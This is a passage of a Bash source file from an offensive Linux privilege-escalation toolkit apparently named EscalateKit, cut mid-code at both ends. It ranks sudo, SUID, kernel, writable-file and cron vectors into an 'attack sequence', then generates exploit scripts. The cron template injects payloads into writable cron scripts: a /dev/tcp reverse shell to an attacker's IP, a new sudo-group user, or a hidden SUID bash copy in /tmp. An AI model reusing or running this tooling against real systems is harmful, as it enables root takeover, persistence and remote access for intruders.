            echo "    Alternative commands:" >>"$detailed_output"
            echo "      - sudo /bin/bash" >>"$detailed_output"
            echo "      - sudo -i" >>"$detailed_output"
            echo "      - sudo sh" >>"$detailed_output"
            high_priority_vulns+=("Full sudo access - Immediate root")
            total_vectors=$((total_vectors + 1))
        fi

        # Extract specific GTFOBins matches with better parsing
        if grep -q "can be exploited" "$OUTPUT_DIR/recon/sudo_privs.txt"; then
            echo "[+] Sudo privilege escalation possible!" >>"$output_file"
            echo "[+] Sudo privilege escalation possible!" >>"$detailed_output"
            echo "Exploitable sudo binaries found:" >>"$detailed_output"

            # Extract specific binaries and commands
            grep -A 3 "can be exploited via sudo" "$OUTPUT_DIR/recon/sudo_privs.txt" | while read -r line; do
                echo "    $line" >>"$detailed_output"
                if [[ "$line" =~ "Exploit command:" ]]; then
                    exploit_cmd=$(echo "$line" | cut -d: -f2-)
                    echo "    Quick exploit: $exploit_cmd" >>"$output_file"
                fi
            done

            echo "    This is the most reliable method. Try it first." >>"$output_file"
            echo "    This is the most reliable method. Try it first." >>"$detailed_output"
            high_priority_vulns+=("Sudo GTFOBins exploitation")
            total_vectors=$((total_vectors + 1))
        fi

        # Check for dangerous group memberships
        if grep -q "docker\|lxd\|disk\|shadow" "$OUTPUT_DIR/recon/sudo_privs.txt"; then
            echo "[+] Dangerous group membership detected!" >>"$output_file"
            echo "[+] Dangerous group membership detected!" >>"$detailed_output"
            echo "Dangerous groups found:" >>"$detailed_output"
            grep -A 2 "Member of.*group" "$OUTPUT_DIR/recon/sudo_privs.txt" | head -10 >>"$output_file"
            grep -A 5 "Member of.*group" "$OUTPUT_DIR/recon/sudo_privs.txt" >>"$detailed_output"
            high_priority_vulns+=("Dangerous group membership")
            total_vectors=$((total_vectors + 1))
        fi
    fi

    # 2. ENHANCED SUID ANALYSIS
    echo -e "\n=== SUID BINARY ANALYSIS ===" >>"$detailed_output"
    if [ -f "$OUTPUT_DIR/recon/suid_files.txt" ]; then
        echo -e "\n[*] Analyzing SUID binaries..." >>"$output_file"
        echo "[*] Analyzing SUID binaries..." >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Copy raw SUID data to detailed output
        echo "Raw SUID files data:" >>"$detailed_output"
        echo "-------------------" >>"$detailed_output"
        cat "$OUTPUT_DIR/recon/suid_files.txt" >>"$detailed_output"
        echo "" >>"$detailed_output"

        suid_count=$(grep -c "can be exploited" "$OUTPUT_DIR/recon/suid_files.txt" 2>/dev/null)
        if [ -z "$suid_count" ]; then
            suid_count=0
        fi
        if [ "$suid_count" -gt 0 ]; then
            echo "[+] $suid_count exploitable SUID binaries found!" >>"$output_file"
            echo "[+] $suid_count exploitable SUID binaries found!" >>"$detailed_output"
            echo "Exploitable SUID binaries:" >>"$detailed_output"

            # Extract specific SUID exploits
            grep -B 1 -A 3 "can be exploited via suid" "$OUTPUT_DIR/recon/suid_files.txt" | while read -r line; do
                echo "    $line" >>"$detailed_output"
                if [[ "$line" =~ "Exploit command:" ]]; then
                    exploit_cmd=$(echo "$line" | cut -d: -f2-)
                    echo "    SUID exploit: $exploit_cmd" >>"$output_file"
                fi
            done

            high_priority_vulns+=("SUID binary exploitation ($suid_count binaries)")
            total_vectors=$((total_vectors + 1))
        else
            echo "[-] No exploitable SUID binaries found via GTFOBins" >>"$detailed_output"
        fi
    fi

    # 3. ENHANCED KERNEL VULNERABILITY ANALYSIS
    echo -e "\n=== KERNEL VULNERABILITY ANALYSIS ===" >>"$detailed_output"
    if [ -f "$OUTPUT_DIR/recon/kernel_exploits.txt" ]; then
        echo -e "\n[*] Analyzing kernel vulnerabilities..." >>"$output_file"
        echo "[*] Analyzing kernel vulnerabilities..." >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Copy raw kernel data to detailed output
        echo "Raw kernel vulnerability data:" >>"$detailed_output"
        echo "-----------------------------" >>"$detailed_output"
        cat "$OUTPUT_DIR/recon/kernel_exploits.txt" >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Count critical vulnerabilities
        critical_kernel_vulns=$(grep -c "CRITICAL:" "$OUTPUT_DIR/recon/kernel_exploits.txt" 2>/dev/null)
        if [ -z "$critical_kernel_vulns" ] || ! [[ "$critical_kernel_vulns" =~ ^[0-9]+$ ]]; then
            critical_kernel_vulns=0
        fi

        high_kernel_vulns=$(grep -c "HIGH:" "$OUTPUT_DIR/recon/kernel_exploits.txt" 2>/dev/null)
        if [ -z "$high_kernel_vulns" ] || ! [[ "$high_kernel_vulns" =~ ^[0-9]+$ ]]; then
            high_kernel_vulns=0
        fi

        if [ "$critical_kernel_vulns" -gt 0 ]; then
            echo "[!] $critical_kernel_vulns CRITICAL kernel vulnerabilities detected!" >>"$output_file"
            echo "[!] $critical_kernel_vulns CRITICAL kernel vulnerabilities detected!" >>"$detailed_output"
            echo "Critical vulnerabilities found:" >>"$detailed_output"

            # Extract specific critical vulnerabilities
            grep -A 2 "CRITICAL:" "$OUTPUT_DIR/recon/kernel_exploits.txt" | while read -r line; do
                echo "    $line" >>"$detailed_output"
                if [[ "$line" =~ "CVE-" ]]; then
                    cve=$(echo "$line" | grep -oE "CVE-[0-9]+-[0-9]+")
                    vuln_name=$(echo "$line" | grep -oE "[A-Za-z ]+\(CVE" | sed 's/(CVE//')
                    echo "    Critical: $vuln_name ($cve)" >>"$output_file"
                fi
            done

            high_priority_vulns+=("Critical kernel vulnerabilities ($critical_kernel_vulns found)")
            total_vectors=$((total_vectors + 1))
        fi

        if [ "$high_kernel_vulns" -gt 0 ]; then
            echo "High severity kernel vulnerabilities: $high_kernel_vulns" >>"$detailed_output"
            medium_priority_vulns+=("High severity kernel vulnerabilities ($high_kernel_vulns found)")
            total_vectors=$((total_vectors + 1))
        fi
    fi

    # 4. ENHANCED WRITABLE FILES ANALYSIS
    echo -e "\n=== WRITABLE FILES ANALYSIS ===" >>"$detailed_output"
    if [ -f "$OUTPUT_DIR/recon/writable_files.txt" ]; then
        echo -e "\n[*] Analyzing writable files..." >>"$output_file"
        echo "[*] Analyzing writable files..." >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Copy raw writable files data to detailed output
        echo "Raw writable files data:" >>"$detailed_output"
        echo "----------------------" >>"$detailed_output"
        cat "$OUTPUT_DIR/recon/writable_files.txt" >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Critical system files
        critical_writable=$(grep -E "(/etc/passwd|/etc/shadow|/etc/sudoers)" "$OUTPUT_DIR/recon/writable_files.txt" 2>/dev/null)
        if [ -n "$critical_writable" ]; then
            echo "[!] CRITICAL: Writable system files detected!" >>"$output_file"
            echo "[!] CRITICAL: Writable system files detected!" >>"$detailed_output"
            echo "$critical_writable" >>"$output_file"
            echo "Critical writable files:" >>"$detailed_output"
            echo "$critical_writable" >>"$detailed_output"
            echo "    These provide immediate privilege escalation!" >>"$output_file"
            echo "    These provide immediate privilege escalation!" >>"$detailed_output"
            high_priority_vulns+=("Critical writable system files")
            total_vectors=$((total_vectors + 1))
        fi

        # Service files
        service_files=$(grep -c "systemd.*service" "$OUTPUT_DIR/recon/writable_files.txt" 2>/dev/null)
        if [ -z "$service_files" ] || ! [[ "$service_files" =~ ^[0-9]+$ ]]; then
            service_files=0
        fi

        if [ "$service_files" -gt 0 ]; then
            echo "[+] $service_files writable systemd service files detected!" >>"$output_file"
            echo "[+] $service_files writable systemd service files detected!" >>"$detailed_output"
            echo "Writable service files:" >>"$detailed_output"
            grep "systemd.*service" "$OUTPUT_DIR/recon/writable_files.txt" | head -3 >>"$output_file"
            grep "systemd.*service" "$OUTPUT_DIR/recon/writable_files.txt" >>"$detailed_output"
            echo "    These can be modified to run commands as root on service restart." >>"$output_file"
            echo "    These can be modified to run commands as root on service restart." >>"$detailed_output"
            medium_priority_vulns+=("Writable service files ($service_files files)")
            total_vectors=$((total_vectors + 1))
        fi

        # Cron files
        cron_files=$(grep -c "cron" "$OUTPUT_DIR/recon/writable_files.txt" 2>/dev/null)
        if [ -z "$cron_files" ] || ! [[ "$cron_files" =~ ^[0-9]+$ ]]; then
            cron_files=0
        fi

        if [ "$cron_files" -gt 0 ]; then
            echo "[+] $cron_files writable cron files detected!" >>"$output_file"
            echo "[+] $cron_files writable cron files detected!" >>"$detailed_output"
            echo "Writable cron files:" >>"$detailed_output"
            grep "cron" "$OUTPUT_DIR/recon/writable_files.txt" >>"$detailed_output"
            medium_priority_vulns+=("Writable cron files ($cron_files files)")
            total_vectors=$((total_vectors + 1))
        fi
    fi

    # 5. ENHANCED CRON JOB ANALYSIS
    echo -e "\n=== CRON JOB ANALYSIS ===" >>"$detailed_output"
    if [ -f "$OUTPUT_DIR/recon/cron_jobs.txt" ]; then
        echo -e "\n[*] Analyzing cron jobs..." >>"$output_file"
        echo "[*] Analyzing cron jobs..." >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Copy raw cron jobs data to detailed output
        echo "Raw cron jobs data:" >>"$detailed_output"
        echo "-----------------" >>"$detailed_output"
        cat "$OUTPUT_DIR/recon/cron_jobs.txt" >>"$detailed_output"
        echo "" >>"$detailed_output"

        writable_cron=$(grep -c "Writable cron script" "$OUTPUT_DIR/recon/cron_jobs.txt" 2>/dev/null)
        if [ -z "$writable_cron" ] || ! [[ "$writable_cron" =~ ^[0-9]+$ ]]; then
            writable_cron=0
        fi
        if [ "$writable_cron" -gt 0 ]; then
            echo "[+] $writable_cron writable cron scripts detected!" >>"$output_file"
            echo "[+] $writable_cron writable cron scripts detected!" >>"$detailed_output"
            echo "Writable cron scripts:" >>"$detailed_output"
            grep "Writable cron script" "$OUTPUT_DIR/recon/cron_jobs.txt" >>"$output_file"
            grep "Writable cron script" "$OUTPUT_DIR/recon/cron_jobs.txt" >>"$detailed_output"
            echo "    These can be modified to execute commands when the cron job runs." >>"$output_file"
            echo "    These can be modified to execute commands when the cron job runs." >>"$detailed_output"
            medium_priority_vulns+=("Writable cron scripts ($writable_cron scripts)")
            total_vectors=$((total_vectors + 1))
        fi
    fi

    # 6. GENERATE COMPREHENSIVE PRIORITY LIST
    echo -e "\n===========================================" >>"$output_file"
    echo "         EXPLOITATION PRIORITY MATRIX" >>"$output_file"
    echo "===========================================" >>"$output_file"
    echo "Total privilege escalation vectors found: $total_vectors" >>"$output_file"
    echo "" >>"$output_file"

    # Add the same content to detailed output
    echo -e "\n===========================================" >>"$detailed_output"
    echo "         EXPLOITATION PRIORITY MATRIX" >>"$detailed_output"
    echo "===========================================" >>"$detailed_output"
    echo "Total privilege escalation vectors found: $total_vectors" >>"$detailed_output"
    echo "" >>"$detailed_output"

    if [ ${#high_priority_vulns[@]} -gt 0 ]; then
        echo "🔴 HIGH PRIORITY (Immediate Exploitation):" >>"$output_file"
        echo "-------------------------------------------" >>"$output_file"
        for i in "${!high_priority_vulns[@]}"; do
            echo "$((i + 1)). ${high_priority_vulns[i]}" >>"$output_file"
        done
        echo "" >>"$output_file"

        # Add to detailed output
        echo "🔴 HIGH PRIORITY (Immediate Exploitation):" >>"$detailed_output"
        echo "-------------------------------------------" >>"$detailed_output"
        for i in "${!high_priority_vulns[@]}"; do
            echo "$((i + 1)). ${high_priority_vulns[i]}" >>"$detailed_output"
        done
        echo "" >>"$detailed_output"
    fi

    if [ ${#medium_priority_vulns[@]} -gt 0 ]; then
        echo "🟡 MEDIUM PRIORITY (Requires Setup/Timing):" >>"$output_file"
        echo "---------------------------------------------" >>"$output_file"
        for i in "${!medium_priority_vulns[@]}"; do
            echo "$((i + 1)). ${medium_priority_vulns[i]}" >>"$output_file"
        done
        echo "" >>"$output_file"

        # Add to detailed output
        echo "🟡 MEDIUM PRIORITY (Requires Setup/Timing):" >>"$detailed_output"
        echo "---------------------------------------------" >>"$detailed_output"
        for i in "${!medium_priority_vulns[@]}"; do
            echo "$((i + 1)). ${medium_priority_vulns[i]}" >>"$detailed_output"
        done
        echo "" >>"$detailed_output"
    fi

    if [ ${#low_priority_vulns[@]} -gt 0 ]; then
        echo "🟢 LOW PRIORITY (Complex/Risky):" >>"$output_file"
        echo "---------------------------------" >>"$output_file"
        for i in "${!low_priority_vulns[@]}"; do
            echo "$((i + 1)). ${low_priority_vulns[i]}" >>"$output_file"
        done
        echo "" >>"$output_file"

        # Add to detailed output
        echo "🟢 LOW PRIORITY (Complex/Risky):" >>"$detailed_output"
        echo "---------------------------------" >>"$detailed_output"
        for i in "${!low_priority_vulns[@]}"; do
            echo "$((i + 1)). ${low_priority_vulns[i]}" >>"$detailed_output"
        done
        echo "" >>"$detailed_output"
    fi

    # 7. GENERATE ACTIONABLE EXPLOITATION PLAN
    echo "===========================================" >>"$output_file"
    echo "         RECOMMENDED ATTACK SEQUENCE" >>"$output_file"
    echo "===========================================" >>"$output_file"

    # Add to detailed output
    echo "===========================================" >>"$detailed_output"
    echo "         RECOMMENDED ATTACK SEQUENCE" >>"$detailed_output"
    echo "===========================================" >>"$detailed_output"

    if [ "$total_vectors" -gt 0 ]; then
        echo "Step-by-step exploitation plan:" >>"$output_file"
        echo "" >>"$output_file"

        # Add to detailed output
        echo "Step-by-step exploitation plan:" >>"$detailed_output"
        echo "" >>"$detailed_output"

        step=1

        # High priority items first
        for vuln in "${high_priority_vulns[@]}"; do
            echo "Step $step: Attempt $vuln" >>"$output_file"
            echo "Step $step: Attempt $vuln" >>"$detailed_output"

            case "$vuln" in
            *"Full sudo access"*)
                echo "  Command: sudo su -" >>"$output_file"
                echo "  Success rate: 100%" >>"$output_file"
                echo "  Command: sudo su -" >>"$detailed_output"
                echo "  Success rate: 100%" >>"$detailed_output"
                echo "  Explanation: User has unrestricted sudo access to all commands" >>"$detailed_output"
                echo "  Alternative commands:" >>"$detailed_output"
                echo "    - sudo /bin/bash" >>"$detailed_output"
                echo "    - sudo -i" >>"$detailed_output"
                echo "    - sudo sh" >>"$detailed_output"
                ;;
            *"GTFOBins"*)
                echo "  Refer to GTFOBins commands in detailed analysis" >>"$output_file"
                echo "  Success rate: 90%+" >>"$output_file"
                echo "  Refer to GTFOBins commands in detailed analysis" >>"$detailed_output"
                echo "  Success rate: 90%+" >>"$detailed_output"
                echo "  Explanation: These binaries can be exploited via sudo privileges" >>"$detailed_output"
                echo "  Check the sudo privileges section for specific exploit commands" >>"$detailed_output"
                ;;
            *"SUID"*)
                echo "  Use SUID exploit commands from recon output" >>"$output_file"
                echo "  Success rate: 80%+" >>"$output_file"
                echo "  Use SUID exploit commands from recon output" >>"$detailed_output"
                echo "  Success rate: 80%+" >>"$detailed_output"
                echo "  Explanation: SUID binaries run with owner privileges" >>"$detailed_output"
                echo "  Check the SUID files section for specific exploits" >>"$detailed_output"
                ;;
            *"Critical kernel"*)
                echo "  Use kernel exploit templates (check /exploit/templates/)" >>"$output_file"
                echo "  Success rate: 70% (system crash risk)" >>"$output_file"
                echo "  Use kernel exploit templates (check /exploit/templates/)" >>"$detailed_output"
                echo "  Success rate: 70% (system crash risk)" >>"$detailed_output"
                echo "  WARNING: Kernel exploits can crash the system" >>"$detailed_output"
                echo "  Test in a safe environment first" >>"$detailed_output"
                ;;
            *"Critical writable system files"*)
                echo "  Modify critical system files for immediate escalation" >>"$output_file"
                echo "  Success rate: 95%" >>"$output_file"
                echo "  Modify critical system files for immediate escalation" >>"$detailed_output"
                echo "  Success rate: 95%" >>"$detailed_output"
                echo "  Explanation: Direct modification of /etc/passwd, /etc/shadow, etc." >>"$detailed_output"
                echo "  Check writable files section for specific files" >>"$detailed_output"
                ;;
            *"Dangerous group membership"*)
                echo "  Exploit group privileges (docker, lxd, etc.)" >>"$output_file"
                echo "  Success rate: 85%" >>"$output_file"
                echo "  Exploit group privileges (docker, lxd, etc.)" >>"$detailed_output"
                echo "  Success rate: 85%" >>"$detailed_output"
                echo "  Explanation: Dangerous group memberships provide privilege escalation paths" >>"$detailed_output"
                echo "  Check sudo privileges section for specific group exploits" >>"$detailed_output"
                ;;
            esac
            echo "" >>"$output_file"
            echo "" >>"$detailed_output"
            step=$((step + 1))
        done

        # Medium priority items
        for vuln in "${medium_priority_vulns[@]}"; do
            echo "Step $step: Attempt $vuln" >>"$output_file"
            echo "  Requires modification of files or waiting for service restarts" >>"$output_file"
            echo "  Success rate: 60-80%" >>"$output_file"
            echo "" >>"$output_file"

            # Add to detailed output with more information
            echo "Step $step: Attempt $vuln" >>"$detailed_output"
            echo "  Requires modification of files or waiting for service restarts" >>"$detailed_output"
            echo "  Success rate: 60-80%" >>"$detailed_output"

            case "$vuln" in
            *"service files"*)
                echo "  Explanation: Modify systemd service files to execute commands as root" >>"$detailed_output"
                echo "  Method: Edit ExecStart parameter in writable service files" >>"$detailed_output"
                echo "  Trigger: Restart the service or wait for automatic restart" >>"$detailed_output"
                ;;
            *"cron"*)
                echo "  Explanation: Modify cron scripts to execute commands when scheduled" >>"$detailed_output"
                echo "  Method: Add reverse shell or privilege escalation commands to writable cron scripts" >>"$detailed_output"
                echo "  Trigger: Wait for cron job execution time" >>"$detailed_output"
                ;;
            *"kernel vulnerabilities"*)
                echo "  Explanation: High severity kernel vulnerabilities that may be exploitable" >>"$detailed_output"
                echo "  Method: Use appropriate kernel exploits for the specific vulnerabilities" >>"$detailed_output"
                echo "  Risk: Medium crash risk, test carefully" >>"$detailed_output"
                ;;
            esac
            echo "" >>"$detailed_output"
            step=$((step + 1))
        done

        # Low priority items (if any)
        for vuln in "${low_priority_vulns[@]}"; do
            echo "Step $step: Consider $vuln" >>"$output_file"
            echo "  Complex setup required or high risk" >>"$output_file"
            echo "  Success rate: 30-60%" >>"$output_file"
            echo "" >>"$output_file"

            echo "Step $step: Consider $vuln" >>"$detailed_output"
            echo "  Complex setup required or high risk" >>"$detailed_output"
            echo "  Success rate: 30-60%" >>"$detailed_output"
            echo "  Note: Only attempt if higher priority methods fail" >>"$detailed_output"
            echo "" >>"$detailed_output"
            step=$((step + 1))
        done

    else
        echo "[-] No clear privilege escalation vectors identified." >>"$output_file"
        echo "" >>"$output_file"
        echo "RECOMMENDATIONS FOR MANUAL ENUMERATION:" >>"$output_file"
        echo "1. Check for running services with 'ps aux'" >>"$output_file"
        echo "2. Look for custom applications in /opt, /usr/local" >>"$output_file"
        echo "3. Check for network services with 'netstat -tlnp'" >>"$output_file"
        echo "4. Examine environment variables with 'env'" >>"$output_file"
        echo "5. Look for interesting files in user directories" >>"$output_file"
        echo "6. Check for Docker containers or VMs" >>"$output_file"
        echo "7. Analyze running processes for potential hijacking" >>"$output_file"

        # Add to detailed output
        echo "[-] No clear privilege escalation vectors identified." >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "RECOMMENDATIONS FOR MANUAL ENUMERATION:" >>"$detailed_output"
        echo "========================================" >>"$detailed_output"
        echo "1. Check for running services with 'ps aux'" >>"$detailed_output"
        echo "   - Look for services running as root" >>"$detailed_output"
        echo "   - Check for custom or unusual services" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "2. Look for custom applications in /opt, /usr/local" >>"$detailed_output"
        echo "   - Custom applications may have vulnerabilities" >>"$detailed_output"
        echo "   - Check for SUID binaries in these locations" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "3. Check for network services with 'netstat -tlnp'" >>"$detailed_output"
        echo "   - Look for services listening on localhost" >>"$detailed_output"
        echo "   - Check for unusual ports or services" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "4. Examine environment variables with 'env'" >>"$detailed_output"
        echo "   - Look for paths, credentials, or configuration" >>"$detailed_output"
        echo "   - Check LD_LIBRARY_PATH and other sensitive variables" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "5. Look for interesting files in user directories" >>"$detailed_output"
        echo "   - Check for configuration files, scripts, credentials" >>"$detailed_output"
        echo "   - Look in .ssh, .config, Documents folders" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "6. Check for Docker containers or VMs" >>"$detailed_output"
        echo "   - Look for container escape opportunities" >>"$detailed_output"
        echo "   - Check for shared volumes or socket access" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "7. Analyze running processes for potential hijacking" >>"$detailed_output"
        echo "   - Look for processes with writable binaries" >>"$detailed_output"
        echo "   - Check for process substitution opportunities" >>"$detailed_output"
        echo "" >>"$detailed_output"
        echo "Additional manual checks to consider:" >>"$detailed_output"
        echo "8. Check for NFS shares: showmount -e localhost" >>"$detailed_output"
        echo "9. Look for database files: find / -name '*.db' -o -name '*.sqlite*' 2>/dev/null" >>"$detailed_output"
        echo "10. Check for backup files: find / -name '*.bak' -o -name '*.backup' 2>/dev/null" >>"$detailed_output"
        echo "11. Examine web application directories for configuration files" >>"$detailed_output"
        echo "12. Check for mail spool: ls -la /var/mail/" >>"$detailed_output"
    fi

    log_message "INFOS" "Exploitation suggestions saved to $output_file"
    log_message "INFOS" "Found $total_vectors potential privilege escalation vectors"

    return 0
}

exploit_generate_templates() {
    log_message "INFOS" "Generating exploit templates"

    mkdir -p "$OUTPUT_DIR/exploit/templates"

    # Check if suggestions exist
    if [ ! -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        log_message "WARN" "Exploitation suggestions not found. Run the exploit suggest module first."
        return 1
    fi

    # Initialize template counter
    template_count=0

    # 1. ENHANCED SUDO EXPLOIT TEMPLATES
    if grep -q "Full sudo access" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating full sudo access template"

        cat >"$OUTPUT_DIR/exploit/templates/sudo_full_access.sh" <<'EOF'
#!/bin/bash
# Full Sudo Access Exploit
# Generated by EscalateKit
# This script exploits full sudo privileges to gain root access

echo "[*] Attempting full sudo privilege escalation..."

# Method 1: Direct su to root
echo "[+] Method 1: Direct su to root"
echo "sudo su -"
echo ""

# Method 2: Bash as root
echo "[+] Method 2: Bash as root"
echo "sudo /bin/bash"
echo ""

# Method 3: Interactive root shell
echo "[+] Method 3: Interactive root shell"
echo "sudo -i"
echo ""

# Method 4: Execute commands as root
echo "[+] Method 4: Execute specific commands as root"
echo "sudo whoami"
echo "sudo id"
echo ""

echo "[!] Just run any of the above commands to gain root access!"
EOF
        chmod +x "$OUTPUT_DIR/exploit/templates/sudo_full_access.sh"
        template_count=$((template_count + 1))
        log_message "INFOS" "Full sudo access template saved"
    fi

    # 2. ENHANCED SUDO GTFOBINS TEMPLATES
    if grep -q "can be exploited via sudo" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating sudo GTFOBins exploit templates"

        # Extract all sudo exploitable binaries and create individual templates
        grep -A 3 "can be exploited via sudo" "$OUTPUT_DIR/exploit/suggestions.txt" | grep -B 1 -A 2 "Exploit command:" | while read -r line; do
            if [[ "$line" =~ "can be exploited via sudo" ]]; then
                binary_name=$(echo "$line" | grep -oE "[a-zA-Z0-9_-]+" | head -n 1)

                # Read the next few lines to get the exploit command
                exploit_cmd=""
                while read -r cmd_line; do
                    if [[ "$cmd_line" =~ "Exploit command:" ]]; then
                        exploit_cmd=$(echo "$cmd_line" | cut -d: -f2- | xargs)
                        break
                    fi
                done

                if [ -n "$binary_name" ] && [ -n "$exploit_cmd" ]; then
                    cat >"$OUTPUT_DIR/exploit/templates/sudo_${binary_name}_exploit.sh" <<EOF
#!/bin/bash
# Sudo $binary_name Exploit
# Generated by EscalateKit
# This script exploits sudo privileges for $binary_name

echo "[*] Exploiting sudo privileges for $binary_name..."
echo "[*] Target binary: $binary_name"
echo "[*] Exploit command: $exploit_cmd"
echo ""

# Verify sudo permissions first
echo "[+] Checking sudo permissions for $binary_name..."
if sudo -l | grep -q "$binary_name"; then
    echo "[+] Confirmed: sudo access to $binary_name detected"
else
    echo "[-] Warning: No sudo access to $binary_name detected"
    echo "    This exploit may not work"
fi
echo ""

# Execute the exploit
echo "[+] Executing exploit..."
echo "Command: $exploit_cmd"
echo ""
echo "[!] Copy and paste the command above to gain root access"
echo "[!] Or uncomment the line below to execute automatically:"
echo "# $exploit_cmd"
EOF
                    chmod +x "$OUTPUT_DIR/exploit/templates/sudo_${binary_name}_exploit.sh"
                    template_count=$((template_count + 1))
                fi
            fi
        done
    fi

    # 3. ENHANCED SUID EXPLOIT TEMPLATES
    if grep -q "can be exploited via suid" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating SUID exploit templates"

        grep -B 1 -A 3 "can be exploited via suid" "$OUTPUT_DIR/exploit/suggestions.txt" | while read -r line; do
            if [[ "$line" =~ "can be exploited via suid" ]]; then
                binary_name=$(echo "$line" | grep -oE "[a-zA-Z0-9_/-]+" | head -n 1 | basename)
                binary_path=$(echo "$line" | grep -oE "/[a-zA-Z0-9_/-]+" | head -n 1)

                # Read the exploit command
                exploit_cmd=""
                while read -r cmd_line; do
                    if [[ "$cmd_line" =~ "Exploit command:" ]]; then
                        exploit_cmd=$(echo "$cmd_line" | cut -d: -f2- | xargs)
                        break
                    fi
                done

                if [ -n "$binary_name" ] && [ -n "$exploit_cmd" ]; then
                    cat >"$OUTPUT_DIR/exploit/templates/suid_${binary_name}_exploit.sh" <<EOF
#!/bin/bash
# SUID $binary_name Exploit
# Generated by EscalateKit
# This script exploits SUID privileges for $binary_name

echo "[*] Exploiting SUID binary: $binary_name"
echo "[*] Binary path: $binary_path"
echo "[*] Exploit command: $exploit_cmd"
echo ""

# Verify SUID bit is set
if [ -f "$binary_path" ]; then
    if [ -u "$binary_path" ]; then
        echo "[+] Confirmed: SUID bit is set on $binary_path"
        ls -la "$binary_path"
    else
        echo "[-] Warning: SUID bit not detected on $binary_path"
        echo "    This exploit may not work"
    fi
else
    echo "[-] Warning: Binary not found at $binary_path"
    echo "    Searching for alternative locations..."
    find /usr/bin /bin /usr/local/bin -name "$binary_name" -perm -4000 2>/dev/null | head -5
fi
echo ""

# Execute the exploit
echo "[+] Executing SUID exploit..."
echo "Command: $exploit_cmd"
echo ""
echo "[!] Copy and paste the command above to gain privileged access"
echo "[!] Or uncomment the line below to execute automatically:"
echo "# $exploit_cmd"
EOF
                    chmod +x "$OUTPUT_DIR/exploit/templates/suid_${binary_name}_exploit.sh"
                    template_count=$((template_count + 1))
                fi
            fi
        done
    fi

    # 4. ENHANCED CRON JOB EXPLOIT TEMPLATES
    if grep -q "writable cron" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating cron job exploit templates"

        # Extract writable cron scripts
        grep -i "writable cron" "$OUTPUT_DIR/exploit/suggestions.txt" | while read -r line; do
            cron_script=$(echo "$line" | grep -oE "/[a-zA-Z0-9_/.,-]+" | head -n 1)

            if [ -n "$cron_script" ]; then
                safe_name=$(echo "$cron_script" | tr '/' '_')

                cat >"$OUTPUT_DIR/exploit/templates/cron_${safe_name}_exploit.sh" <<EOF
#!/bin/bash
# Cron Job Exploit for $cron_script
# Generated by EscalateKit

echo "[*] Exploiting writable cron script: $cron_script"
echo ""

# Check if the script exists and is writable
if [ -f "$cron_script" ]; then
    if [ -w "$cron_script" ]; then
        echo "[+] Confirmed: $cron_script is writable"
    else
        echo "[-] Error: $cron_script is not writable"
        exit 1
    fi
else
    echo "[-] Error: $cron_script does not exist"
    exit 1
fi

# Show current cron script content
echo "[*] Current cron script content:"
echo "--- BEGIN CURRENT CONTENT ---"
cat "$cron_script"
echo "--- END CURRENT CONTENT ---"
echo ""

# Backup the original script
backup_file="${cron_script}.bak.\$(date +%s)"
echo "[*] Creating backup: \$backup_file"
cp "$cron_script" "\$backup_file"

# Payload options
echo "[*] Choose your payload method:"
echo "1. Reverse shell"
echo "2. Add privileged user"
echo "3. Copy /bin/bash to /tmp with SUID"
echo "4. Custom payload"
echo ""

read -p "Enter choice (1-4): " choice

case \$choice in
    1)
        read -p "Enter your IP address: " attacker_ip
        read -p "Enter your port: " attacker_port
        
        cat >> "$cron_script" << PAYLOAD
# Reverse shell payload added by EscalateKit
bash -c 'bash -i >& /dev/tcp/\$attacker_ip/\$attacker_port 0>&1' &
PAYLOAD
        echo "[+] Reverse shell payload added"
        echo "[+] Set up listener: nc -lvnp \$attacker_port"
        ;;
    2)
        read -p "Enter username to create: " new_user
        read -p "Enter password: " new_pass
        
        cat >> "$cron_script" << PAYLOAD
# Add privileged user payload
useradd -m -s /bin/bash -G sudo \$new_user 2>/dev/null
echo '\$new_user:\$new_pass' | chpasswd 2>/dev/null
PAYLOAD
        echo "[+] Privileged user creation payload added"
        echo "[+] User: \$new_user, Password: \$new_pass"
        ;;
    3)
        cat >> "$cron_script" << PAYLOAD
# SUID bash payload
cp /bin/bash /tmp/.hidden_bash 2>/dev/null
chmod +s /tmp/.hidden_bash 2>/dev/null
PAYLOAD
        echo "[+] SUID bash payload added"
        echo "[+] After cron runs, execute: /tmp/.hidden_bash -p"
        ;;
    4)
        echo "Enter your custom payload (press Ctrl+D when done):"
        cat >> "$cron_script"
        echo "[+] Custom payload added"
        ;;
    *)
        echo "[-] Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "[+] Exploit deployed to $cron_script"
echo "[*] Waiting for cron job to execute..."
echo "[*] Monitor the system for payload execution"

# Restore option
echo ""
echo "To restore original script, run:"
echo "cp \$backup_file $cron_script"
EOF
                chmod +x "$OUTPUT_DIR/exploit/templates/cron_${safe_name}_exploit.sh"
                template_count=$((template_count + 1))
            fi
        done
    fi

    # 5. KERNEL EXPLOIT TEMPLATES
    if grep -q "CRITICAL.*kernel" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating kernel exploit templates"

        # Create a general kernel exploit downloader/compiler template
        cat >"$OUTPUT_DIR/exploit/templates/kernel_exploit_helper.sh" <<'EOF'
#!/bin/bash
# Kernel Exploit Helper
# Generated by EscalateKit

echo "[*] Kernel Exploit Helper"
echo "[*] This script helps download and compile kernel exploits"
echo ""

# Get system information
kernel_version=$(uname -r)
arch=$(uname -m)

echo "[*] System Information:"
echo "    Kernel: $kernel_version"
echo "    Architecture: $arch"
